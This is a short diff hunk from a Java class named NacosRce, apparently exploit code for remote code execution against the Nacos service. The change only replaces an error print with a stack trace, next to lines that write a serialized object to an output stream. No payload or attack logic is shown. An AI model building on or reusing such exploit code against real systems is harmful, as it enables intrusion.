@@ -113,7 +113,7 @@ public class NacosRce {
             output.writeObject(obj);
             output.flushBuffer();
         }catch (Exception e){
-            System.err.println(e);
+            e.printStackTrace();
         }
 
 
